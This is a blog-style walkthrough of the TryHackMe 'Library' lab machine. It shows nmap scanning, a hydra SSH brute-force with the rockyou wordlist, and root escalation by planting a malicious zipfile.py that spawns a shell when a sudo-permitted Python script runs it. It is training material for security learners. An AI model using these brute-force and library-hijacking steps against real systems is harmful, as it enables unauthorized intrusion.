---
title : "Library - Write Up"
date : 2021-07-04T14:07:30+02:00
author : "Lanfran02"
cover : "cover.jpeg"
useRelativeCover : true
description : "TryHackMe's easy level machine."
tags : ["hydra","python","PATH","sudo","TryHackMe"]
---

| Link | Level | Creator |
|------|-------|---------|
| [Here](https://tryhackme.com/room/bsidesgtlibrary)  | Easy  |  [stuxnet](https://tryhackme.com/p/stuxnet)  |

## Reconn

Using `nmap` we get the open ports of the machine

```bash
╰─ lanfran@parrot ❯ map 10.10.70.175                                                                                               ─╯
[sudo] password for lanfran: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 14:10 CEST
Nmap scan report for 10.10.70.175
Host is up (0.056s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.75 seconds
```

So let's go to the webpage on the port 80.

It's a pretty simple page, but if we are a little smart, we can get 4 users!
- www-data
- root
- meliodas
- anonymous

Also, if we go to the `robots.txt` file, we get a hint "rockyou"

```bash
╰─ lanfran@parrot ❯ curl 10.10.70.175/robots.txt                                                                                   ─╯
User-agent: rockyou 
Disallow: /%  
```

Maybe if we try to bruteforce with `hydra` the SSH login of an user with the rockyou wordlist?

Let's try it!

## Foothold - User

```bash
╰─ lanfran@parrot ❯ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.70.175                                        ─╯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-22 21:56:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.70.175:22/
^V[STATUS] 97.00 tries/min, 97 tries in 00:01h, 14344303 to do in 2464:40h, 16 active
[22][ssh] host: 10.10.70.175   login: meliodas   password: [REDACTED]
```

YES! It worked!

So let's use the password of meliodas and login to the SSH!

```bash
╰─ lanfran@parrot ❯ ssh meliodas@10.10.70.175                                                                                      ─╯
[...]
meliodas@ubuntu:~$ ls -la
total 40
drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
meliodas@ubuntu:~$ cat user.txt 
6[REDACTED]c
```
We get the user's flag

## Root

First let's run `sudo -l` to see if the user is inside the sudoers.

```bash
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```
Yes, we can run a file with `/usr/bin/python*` and with sudo!

Reading the file `bak.py` we can see that it's using a library called "zipfile" and the $PATH is set to first check the home directory.
So we can exploit this, and create a malicious "lib" in the home directory.

```bash
meliodas@ubuntu:~$ cat bak.py 
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
meliodas@ubuntu:~$ echo $PATH
/home/meliodas/bin:/home/meliodas/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
meliodas@ubuntu:~$ echo 'import os; os.system("/bin/sh")' > zipfile.py
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt	
e[REDACTED]7
```
And we rooted the machine!

That's all from my side, hope you find this helpful!